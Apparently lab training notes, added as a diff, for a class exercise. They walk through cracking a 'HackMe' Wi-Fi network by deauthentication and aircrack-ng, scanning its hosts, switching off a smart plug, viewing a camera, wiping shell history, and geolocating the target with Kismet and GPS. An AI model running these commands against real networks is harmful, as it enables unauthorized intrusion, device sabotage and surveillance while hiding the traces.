@@ -1,0 +1,106 @@
+FTX - Effect Exercise
+Class: 25/006
+Note: Some commands require SUDO; Advisable to set up collection and command terminal windows
+
+Steps: 
+Confirm wlan int is up
+	iwconfig
+Change mac to hide Alfa - good best practice
+	sudo macchanger -r wlan1
+Place int in monitor mode -> this is a critical step.
+	airmon-ng start wlan1
+	confirm in iwconfig
+Initial scan
+	airodump-ng wlan1mon
+	 0C:9D:92:49:C2:A8  -46       52       10    0   1  195   WPA2 CCMP   PSK  BOLC_006_HackMe 
+	    
+Channel Loc and BBSID lock
+	airodump-ng wlan1mon -c 1 --bssid 0C:9D:92:49:C2:A8 
+Posture to collect handshake
+	airodump-ng wlan1mon -c 1 --bssid 0C:9D:92:49:C2:A8 --write 006hackmehandshake
+	
+Conduct Deauth
+	aireplay-ng --deauth 100 -a 0C:9D:92:49:C2:A8 wlan1mon
+Confirm in airodump window that handshake is collected
+	PMKID found: 0C:9D:92:49:C2:A8 
+Find PW
+	aircrack-ng 006hackmehandshake-01.cap -w /usr/share/wordlists/rockyou.txt 
+	key found: quicksilver
+Authenticate with AP
+	ifconfig (confirm you have an IP)
+	192.168.50.3
+Ping sweep 
+	Initial Ping Sweep - 
+	for i in {1..254}; do ping -c 1 192.168.50.$i | grep "from"; done
+	.1 and .3 -> however, there may be hidden IPs. 
+	
+	Stealth PingSweep on /24 for hidden or non-visible IPs
+	nmap -sP 192.168.50.1/24 -oA pingsweep
+	Note: -oA produces files on local box (artifacts) for related request
+	Evidence: .1 (asus), .76 (tplink), .197 (dlink)
+	
+Vert scan each host
+	nmap -Pn -n -sT -sV 192.168.50.1 -oA tcpscan
+	.1 - port 53,80
+	.76 - port 9999
+	.197 - port 80, 443,554, 49152
+Hacker boi shit
+	./tplink_smartplug.py -t <ip> [-c <cmd> || -j <json>]
+	Provide the target IP using -t and a command to send using either -c or -j. Commands for the -c flag:
+	
+	verify the right tplink or target	
+	python3 tplink_smartplug.py -t 192.168.50.76 -c info 
+	degrade system (turn off)
+	python3 tplink_smartplug.py -t 192.168.50.76 -c off
+	
+Capture screenshots from camera:
+	Navigate to Browser for .197 (Dlink) - This is the camera system
+	Verify on Status Page to verify right camera
+	Take Screenshots (as needed) on required cyber intel
+	
+Clean Up for Next User / Trainee
+	a. rm files and artifacts
+	b. clear history using: echo -n > ~/.zsh_history && exec zsh
+	c. Go into settings manager in Kali, for Advanced Network Configurations for network. Remove wifi network of target.
+	
+	------- GPS Based Exercise -------
+
+
+
+Using Kismet to understand where you collected target BSSID
+
+Checks for HW and Functions
+	ls /dev/ttyUSB0 will check that laptop can see USB
+	cgps -s to confirm gps is working (look for 3D FIX)
+	
+	Check to see if you can see the target via alfa network 
+	airodump-ng wlan1mon
+
+Start Collection via Kismet
+	sudo kismet
+	rightclick link in terminal (top line) to open browser - this will be http://localhost:2501
+Configure and Verify Kismet Activity in GUI	
+	enable datasource (top left hamburger menu)
+	select wlan1mon
+	select all channels
+	check top right of kismet to ensure it is seeing GPS data
+	ensure target is collected in kismet web gui (devices tab)
+	CTRL C the kismet terminal and close browser
+	Note: This will produce a .kismet file type for your next step.
+
+Convert .kismet file .kml - This converts your data file into a usable mapping file
+	kismetdb_to_kml --in INPUT.kismet --out OUTPUT.kml
+	Example: sudo kismetdb_to_kml --in Kismet-20260220-15-17-24-1.kismet --out OUTPUT.kml
+	Note: elevated privleges is needed to write a new file
+	
+Open Google Earth via Kali (local box menu)
+	Import .kml file you created (file -> open) - Note filter All Files to see your .kml
+	search for target in the left side of google earth screen
+	To better mark your target, right click -> properties. Modify the symbol. Save. 
+	Look at location you collected on target
+		Note: Lat / Long - Under Properties, you can identify the longitude and latitude of the target
+		Note: Military Grid - Under Tools (top banner), change to Military Grid System. Then go under Properties and identify the grid coordinate. 
+		
+	
+	
+	
